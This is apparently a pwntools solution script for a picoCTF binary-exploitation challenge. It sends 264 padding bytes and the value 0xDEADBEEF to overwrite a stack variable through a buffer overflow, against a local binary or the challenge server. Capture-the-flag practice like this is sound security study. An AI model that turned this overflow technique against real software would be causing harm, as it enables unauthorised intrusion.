#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mars.picoctf.net", 31890)

    return r


def main():
    r = conn()

    to_inject = 0xDEADBEEF

    r.sendlineafter(b'see?\n', 
        b'A'*264 + 
        p64(to_inject)
    )

    while True:
        print(r.recvline())

    r.interactive()


if __name__ == "__main__":
    main()
